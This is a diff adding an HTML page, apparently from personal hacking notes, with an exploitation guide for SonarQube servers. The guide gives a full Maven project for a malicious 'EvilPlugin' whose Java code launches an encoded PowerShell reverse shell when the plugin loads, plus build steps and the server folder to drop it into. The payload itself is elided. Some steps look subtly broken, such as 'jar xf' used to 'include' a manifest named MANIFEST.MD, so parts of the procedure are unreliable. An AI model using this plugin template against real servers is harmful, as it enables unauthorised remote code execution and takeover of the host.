@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>SonarQube (TCP/9000)</h1>
+            <p>SonarQube is a leading automated code quality and security analysis platform</p>
+        </div>
+        <div class="notion-body">
+            
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Building a malicious plugin</h3>
+                <ul>
+                <p>Just in case you have credentials to login in the Sonarqube web panel and the hability to import new plugins you could stablish a reverse shell connection with the server</p>
+                
+                    <p>But first let's clear some things. It is possible that the option to upload plugins is disabled, in that case you must already have a connection inside the box which is hosting the sonarqube. That way you will be able to place the .jar plugin inside</p>
+                    <b>Have in mind that the code may change based on the version of sonarqube you are targeting</b>
+                    <p>In order to develop the plugin you'll need the following folder structure</p>
+                    
+                    <pre><code class="language-bash">├── META-INF
+│   └── MANIFEST.MF
+├── pom.xml
+├── src
+│   └── main
+│       └── java
+│           └── com
+│               └── evil
+│                   └── EvilPlugin.java</code></pre>
+
+                    <p>The file pom.xml may contain. This file only contains information to load the plugin sucessfully</p>
+                    <pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;project&gt;
+  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+  &lt;groupId&gt;com.evil&lt;/groupId&gt;
+  &lt;artifactId&gt;sonar-evil-plugin&lt;/artifactId&gt;
+  &lt;version&gt;1.0&lt;/version&gt;
+  &lt;packaging&gt;sonar-plugin&lt;/packaging&gt;
+  &lt;dependencies&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.sonarsource.sonarqube&lt;/groupId&gt;
+      &lt;artifactId&gt;sonar-plugin-api&lt;/artifactId&gt;
+      &lt;version&gt;7.8&lt;/version&gt;
+      &lt;scope&gt;provided&lt;/scope&gt;
+    &lt;/dependency&gt;
+  &lt;/dependencies&gt;
+  &lt;build&gt;
+    &lt;plugins&gt;
+      &lt;plugin&gt;
+        &lt;groupId&gt;org.sonarsource.sonar-packaging-maven-plugin&lt;/groupId&gt;
+        &lt;artifactId&gt;sonar-packaging-maven-plugin&lt;/artifactId&gt;
+        &lt;version&gt;1.18.0.372&lt;/version&gt;
+        &lt;extensions&gt;true&lt;/extensions&gt;
+        &lt;configuration&gt;
+          &lt;pluginKey&gt;evil&lt;/pluginKey&gt;
+          &lt;pluginName&gt;Evil Plugin&lt;/pluginName&gt;
+          &lt;pluginClass&gt;com.evil.EvilPlugin&lt;/pluginClass&gt;
+          &lt;pluginDescription&gt;Evil Plugin&lt;/pluginDescription&gt;
+          &lt;sonarQubeMinVersion&gt;6.7&lt;/sonarQubeMinVersion&gt;
+        &lt;/configuration&gt;
+      &lt;/plugin&gt;
+    &lt;/plugins&gt;
+  &lt;/build&gt;
+&lt;/project&gt;</code></pre>
+                 
+                <p>The file EvilPlugin.java contains the code itself where the reverse shell resides</p>
+                <pre><code class="language-java">package com.evil;
+
+import org.sonar.api.Plugin;
+
+public class EvilPlugin implements Plugin {
+    @Override
+    public void define(Context context) {
+        try {
+            String[] cmd = {"powershell.exe", "-e", "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgB (Base64 powershell reverse shell)"};
+            ProcessBuilder pb = new ProcessBuilder(cmd);
+            pb.start();
+        } catch (Exception e) {}
+    }
+}</code></pre>
+              
+            <p>Now compile it using </p>
+            <pre><code class="language-java">mvn clean package</code></pre>
+            <p>And include the manifest</p>
+            <pre><code class="language-java">jar xf target/sonar-evil-plugin-1.0.jar META-INF/MANIFEST.MD</code></pre>
+            
+            <p>This will generate a target folder where the .jar file will be placed. Now situate this file inside the following folder of the target box</p>
+            <pre><code class="language-java">C:\sonarqube\sonarqube-7.8\extensions\plugins</code></pre>
+            <p>And finally to load the plugin the sonarqube service must be restarted. This can be done from the web panel of sonarqube</p>
+            </ul>
+
+            </ul> 
+        </div>
+    </div>
+
+
+</body>
+</html>
